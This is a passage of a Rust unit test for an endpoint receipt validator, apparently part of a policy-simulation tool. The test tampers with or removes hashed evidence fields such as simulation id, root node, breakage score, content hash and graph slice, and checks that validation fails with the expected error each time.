        receipt.graph.process_node_id.as_deref(),
        Some(process_node_id.as_str())
    );
    assert!(receipt
        .evidence
        .iter()
        .any(|item| item.key == "contentHash"));
    assert!(receipt
        .evidence
        .iter()
        .any(|item| item.key == "affectedIdentityContext"));
    assert!(receipt
        .evidence
        .iter()
        .any(|item| item.key == "affectedToolContext"));

    let mut mismatched_simulation_id = receipt.clone();
    if let Some(simulation_id_evidence) = mismatched_simulation_id
        .evidence
        .iter_mut()
        .find(|item| item.key == "simulationId")
    {
        *simulation_id_evidence =
            EndpointReceiptEvidence::hashed("simulationId", "policy_simulation:other");
    }
    assert!(mismatched_simulation_id
        .validate()
        .unwrap_err()
        .to_string()
        .contains("simulation id evidence hash"));

    let mut relabeled_simulation_id = receipt.clone();
    relabeled_simulation_id.decision.finding_id = Some("policy_simulation:other".to_string());
    if let Some(simulation_id_evidence) = relabeled_simulation_id
        .evidence
        .iter_mut()
        .find(|item| item.key == "simulationId")
    {
        *simulation_id_evidence =
            EndpointReceiptEvidence::hashed("simulationId", "policy_simulation:other");
    }
    assert!(relabeled_simulation_id
        .validate()
        .unwrap_err()
        .to_string()
        .contains("simulation id"));

    let mut mismatched_root_node = receipt.clone();
    if let Some(root_node_evidence) = mismatched_root_node
        .evidence
        .iter_mut()
        .find(|item| item.key == "rootNodeId")
    {
        *root_node_evidence = EndpointReceiptEvidence::hashed("rootNodeId", "node:other");
    }
    assert!(mismatched_root_node
        .validate()
        .unwrap_err()
        .to_string()
        .contains("simulation root node evidence hash"));

    let mut mismatched_breakage_score = receipt.clone();
    if let Some(score_evidence) = mismatched_breakage_score
        .evidence
        .iter_mut()
        .find(|item| item.key == "developerBreakageScore")
    {
        *score_evidence = EndpointReceiptEvidence::hashed("developerBreakageScore", "0");
    }
    assert!(mismatched_breakage_score
        .validate()
        .unwrap_err()
        .to_string()
        .contains("simulation breakage score evidence hash"));

    let mut missing_identity_context = receipt.clone();
    missing_identity_context
        .evidence
        .retain(|item| item.key != "affectedIdentityContext");
    assert!(missing_identity_context
        .validate()
        .unwrap_err()
        .to_string()
        .contains("simulation affected identity context evidence"));

    let mut missing_tool_context = receipt.clone();
    missing_tool_context
        .evidence
        .retain(|item| item.key != "affectedToolContext");
    assert!(missing_tool_context
        .validate()
        .unwrap_err()
        .to_string()
        .contains("simulation affected tool context evidence"));

    let mut mismatched_content_hash = receipt.clone();
    if let Some(content_hash_evidence) = mismatched_content_hash
        .evidence
        .iter_mut()
        .find(|item| item.key == "contentHash")
    {
        *content_hash_evidence = EndpointReceiptEvidence::hashed("contentHash", "sha256:other");
    }
    assert!(mismatched_content_hash
        .validate()
        .unwrap_err()
        .to_string()
        .contains("simulation content hash evidence hash"));

    let mut mismatched_root_reference = receipt.clone();
    mismatched_root_reference.graph.process_node_id = Some("node:other".to_string());
    if let Some(root_node_evidence) = mismatched_root_reference
        .evidence
        .iter_mut()
        .find(|item| item.key == "rootNodeId")
    {
        *root_node_evidence = EndpointReceiptEvidence::hashed("rootNodeId", "node:other");
    }
    assert!(mismatched_root_reference
        .validate()
        .unwrap_err()
        .to_string()
        .contains("simulation graph root reference"));

    let mut mismatched_graph_slice_reference = receipt.clone();
    mismatched_graph_slice_reference.graph.graph_slice_id = Some("graph_slice:other".to_string());
    if let Some(graph_slice_evidence) = mismatched_graph_slice_reference
        .evidence
        .iter_mut()
        .find(|item| item.key == "graphSliceId")
    {
        *graph_slice_evidence =
            EndpointReceiptEvidence::hashed("graphSliceId", "graph_slice:other");
    }
    assert!(mismatched_graph_slice_reference
        .validate()
        .unwrap_err()
        .to_string()
        .contains("simulation graph slice reference"));
}

